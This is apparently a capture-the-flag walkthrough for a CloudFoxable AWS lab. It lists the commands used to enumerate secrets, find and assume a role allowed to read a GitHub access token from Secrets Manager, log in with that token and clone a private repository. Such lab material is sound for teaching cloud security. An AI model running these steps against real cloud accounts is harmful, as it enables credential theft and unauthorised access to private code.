
#### find interesting secret

❯ cloudfox aws -p cflab secrets -v2


#### Who can access the secret?

❯ pmapper --profile cflab query "who can do secretsmanager:GetSecretValue with arn:aws:secretsmanager:us-west-2:049881439828:secret:github-pat-LvWNL0"


#### who can assume that role?

❯ cloudfox aws -p cflab role-trusts -v2

### From ctf starting user assume the role
❯ aws sts assume-role --role-arn arn:aws:iam::049881439828:role/ml-engineering --role-session-name test

or configure your profile: 

[profile ml-engineering]
region = us-west-2
role_arn = arn:aws:iam::049881439828:role/ml-engineering
source_profile = ctf

### Access the cloudfox secrets loot file
❯ cat pull-secrets-commands.txt
aws --profile $profile --region us-west-2 secretsmanager get-secret-value --secret-id github-pat

export profile=ml-engineering


❯ aws --profile $profile --region us-west-2 secretsmanager get-secret-value --secret-id github-pat

### Install gh command line tool and authenticate with token

echo TOKEN_VALUE > token
gh auth login --with-token < token
gh repo list

## Find the private repo and clone it

❯ gh repo clone cloudfoxable/super-secret-ML-stuff

## Find the flag
